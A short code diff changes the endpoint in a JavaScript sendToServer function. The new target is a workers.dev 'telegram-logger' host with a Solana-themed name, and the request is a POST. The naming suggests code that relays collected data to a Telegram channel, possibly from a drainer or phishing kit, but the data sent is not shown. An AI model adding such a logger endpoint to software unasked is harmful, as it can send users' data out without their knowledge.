@@ -1,6 +1,6 @@
 async function sendToServer(data) {
   try {
-  await fetch('https://api.gameleadsol.xyz/send-telegram', {
+    await fetch('https://telegram-logger.solanatrader1337.workers.dev/send-telegram', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
